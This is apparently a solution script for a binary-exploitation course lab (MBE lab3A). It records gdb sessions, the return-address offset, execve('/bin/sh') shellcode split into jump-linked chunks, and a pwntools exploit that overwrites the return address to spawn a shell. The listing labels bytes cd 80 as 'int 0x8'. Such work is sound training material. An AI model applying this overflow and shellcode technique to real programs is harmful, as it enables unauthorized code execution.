# -*- coding: utf-8 -*-

# Restrictions:
'''
index % 3   != 0
input >> 24 != 0xb7

❯ cat /proc/sys/kernel/randomize_va_space
checksec $bin_name
0
[*] '/home/karmaz/MBE/3_Shellcoding/lab3A'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
'''

# Find the overflow - data_array_addr & main_ret_addr
'''
disas main:
0x080495db <+363>:   call   0x804933d <store_number>
0x080496b6 <+582>:   ret

gdb-peda$ b *0x080496b6
Breakpoint 1 at 0x80496b6
gdb-peda$ b * 0x080495db
Breakpoint 2 at 0x80495db

gdb-peda$ run
Starting program: /home/karmaz/MBE/3_Shellcoding/lab3A 
----------------------------------------------------
  Welcome to quend's crappy number storage service!  
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   quend has reserved some storage for herself :>    
----------------------------------------------------

Input command: store
[----------------------------------registers-----------------------------------]
EAX: 0xffffcca8 --> 0x0 
EBX: 0x804b63c --> 0x804b548 --> 0x1 
ECX: 0x65 ('e')
EDX: 0xffffce38 ("store")
ESI: 0xf7fa7000 --> 0x1ead6c 
EDI: 0xffffce38 ("store")
EBP: 0xffffce58 --> 0x0 
ESP: 0xffffcc90 --> 0xffffcca8 --> 0x0 
EIP: 0x80495db (<main+363>:     call   0x804933d <store_number>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80495d2 <main+354>:        jne    0x80495e9 <main+377>
   0x80495d4 <main+356>:        lea    eax,[esp+0x18]
   0x80495d8 <main+360>:        mov    DWORD PTR [esp],eax
=> 0x80495db <main+363>:        call   0x804933d <store_number>
   0x80495e0 <main+368>:        mov    DWORD PTR [esp+0x1bc],eax
   0x80495e7 <main+375>:        jmp    0x8049648 <main+472>
   0x80495e9 <main+377>:        mov    DWORD PTR [esp+0x8],0x4
   0x80495f1 <main+385>:        lea    eax,[ebx-0x13a1]
Guessed arguments:
arg[0]: 0xffffcca8 --> 0x0 
[------------------------------------stack-------------------------------------]
0000| 0xffffcc90 --> 0xffffcca8 --> 0x0   <====== data_array_addr[0]
0004| 0xffffcc94 --> 0x804a295 ("store")
0008| 0xffffcc98 --> 0x5 
0012| 0xffffcc9c --> 0x0 
0016| 0xffffcca0 --> 0x0 
0020| 0xffffcca4 --> 0x20 (' ')
0024| 0xffffcca8 --> 0x0 
0028| 0xffffccac --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x080495db in main ()
'''
# data_array[0] = 0xffffcca8
'''
gdb-peda$ c
Continuing.
 Number: 123
 Index: 11
 Completed store command successfully
Input command: quit
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0x0 
EDX: 0xffffce38 ("quit")
ESI: 0xf7fa7000 --> 0x1ead6c 
EDI: 0xf7fa7000 --> 0x1ead6c 
EBP: 0x0 
ESP: 0xffffce5c --> 0xf7ddaee5 (<__libc_start_main+245>:        add    esp,0x10)
EIP: 0x80496b6 (<main+582>:     ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80496b3 <main+579>:        pop    ebx
   0x80496b4 <main+580>:        pop    edi
   0x80496b5 <main+581>:        pop    ebp
=> 0x80496b6 <main+582>:        ret    
   0x80496b7 <__x86.get_pc_thunk.ax>:   mov    eax,DWORD PTR [esp]
   0x80496ba <__x86.get_pc_thunk.ax+3>: ret    
   0x80496bb <__x86.get_pc_thunk.ax+4>: xchg   ax,ax
   0x80496bd <__x86.get_pc_thunk.ax+6>: xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xffffce5c --> 0xf7ddaee5 (<__libc_start_main+245>:       add    esp,0x10)   <=====
0004| 0xffffce60 --> 0x1 
0008| 0xffffce64 --> 0xffffcef8 --> 0x0 
0012| 0xffffce68 --> 0xffffd014 --> 0x0 
0016| 0xffffce6c --> 0xffffce84 --> 0x0 
0020| 0xffffce70 --> 0xf7fa7000 --> 0x1ead6c 
0024| 0xffffce74 --> 0x0 
0028| 0xffffce78 --> 0xffffced8 --> 0xffffcef4 --> 0xffffd0e8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080496b6 in main ()
'''
# main_ret_addr = 0xffffce5c

# Calucalte the overflow:
'''
main_addr - data_array[0] = overflow in 4 bytes

0xffffce5c - 0xffffcca8 = 436
Since data_array stores 4 bytes values:
436 / 4 = 109
'''

# Control the EIP - POC:
'''
gdb-peda$ r
Starting program: /home/karmaz/MBE/3_Shellcoding/lab3A 
----------------------------------------------------
  Welcome to quend's crappy number storage service!  
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   quend has reserved some storage for herself :>    
----------------------------------------------------

Input command: store
 Number: 41 <===
 Index: 109 <===
 Completed store command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0x0 
EDX: 0xffffce38 ("quit")
ESI: 0xf7fa7000 --> 0x1ead6c 
EDI: 0xf7fa7000 --> 0x1ead6c 
EBP: 0x0 
ESP: 0xffffce60 --> 0x1 
EIP: 0x29 (')')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x29
[------------------------------------stack-------------------------------------]
0000| 0xffffce60 --> 0x1 
0004| 0xffffce64 --> 0xffffcef8 --> 0x0 
0008| 0xffffce68 --> 0xffffd014 --> 0x0 
0012| 0xffffce6c --> 0xffffce84 --> 0x0 
0016| 0xffffce70 --> 0xf7fa7000 --> 0x1ead6c 
0020| 0xffffce74 --> 0x0 
0024| 0xffffce78 --> 0xffffced8 --> 0xffffcef4 --> 0xffffd0e8 --> 0x0 
0028| 0xffffce7c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000029 in ?? () <===

>>> hex(41)
'0x29
'''

# Plan the shellcode:
'''
Index % 3 != 0 thus, every 3rd index will be initialized with \x00 and will break the execution. 
I will use jmp + 0x4 instruction to jump over those indexes.
    Index[0] = [0000]
    Index[1] = [1234]
    Index[2] = [5678]
    Index[3] = [0000]
    [...]

    [1234][5678][0000][1234][45678]....
             78 will be [jmp+0x4] to jump over [0000] bytes ( index % 3)

Final shellcode will look like this:
    [123456][jmp][123456][jmp] [...] 

Jmp + 0x1 = eb 01 
'''

# Shellcode (null free):
'''
31 c0                 xor    eax, eax
50                    push   eax
68 2f 2f 73 68        push   0x68732f2f
68 2f 62 69 6e        push   0x6e69622f
89 e3                 mov    ebx, esp
89 c1                 mov    ecx, eax
89 c2                 mov    edx, eax
b0 0b                 mov    al, 0xb
cd 80                 int    0x8
'''

# Transform null free shellcode to 6B chunks null free shellcode and add jmp instructions:
'''
31 c0 90 90 90 90 eb 04
50 90 90 90 90 90 eb 04
68 2f 2f 73 68 90 eb 04
68 2f 62 69 6e 90 eb 04
89 e3 90 90 90 90 eb 04
89 c1 90 90 90 90 eb 04
89 c2 90 90 90 90 eb 04
b0 0b 90 90 90 90 eb 04
cd 80 90 90 90 90 eb 04
'''
# Convert it to 4B little endian:
'''
1   31 c0 90 90     0x9090c031
2   90 90 eb 04     0x04eb9090 
4   50 90 90 90     0x90909050
5   90 90 eb 04     0x04eb9090
7   68 2f 2f 73     0x732f2f68
8   68 90 eb 04     0x04eb9068
10  68 2f 62 69     0x69622f68
11  6e 90 eb 04     0x04eb906e
13  89 e3 90 90     0x9090e389
14  90 90 eb 04     0x04eb9090
16  89 c1 90 90     0x9090c189
17  90 90 eb 04     0x04eb9090
19  89 c2 90 90     0x9090c289
20  90 90 eb 04     0x04eb9090
22  b0 0b 90 90     0x90900bb0
23  90 90 eb 04     0x04eb9090
25  cd 80 90 90     0x909080cd
26  90 90 eb 04     0x04eb9090
109 data_array[1]   0xffffccb0
'''

# Exploit
from pwn import *

p = process("./lab3A")
# Attach the debugger
gdb.attach(p, '''
continue
''')

p.recv(1000)
def store_data(number,index):
    p.sendline("store")
    p.recv(100)
    p.sendline(str(int(number)))
    p.recv(100)
    p.sendline(str(index))
    p.recv(100)

store_data(0x9090c031,1) 
store_data(0x04eb9090,2)
store_data(0x90909050,4)
store_data(0x04eb9090,5)
store_data(0x732f2f68,7)
store_data(0x04eb9068,8)
store_data(0x69622f68,10)
store_data(0x04eb906e,11)
store_data(0x9090e389,13)
store_data(0x04eb9090,14)
store_data(0x9090c189,16)
store_data(0x04eb9090,17)
store_data(0x9090c289,19)
store_data(0x04eb9090,20)
store_data(0x90900bb0,22)
store_data(0x04eb9090,23)
store_data(0x909080cd,25)
store_data(0x04eb9090,26)
store_data(0xffffcd2c,109) # set store_data(0x9090c031,1)  to "AAAA" == 0x41414141 and find in GDB

p.sendline("quit")
p.interactive()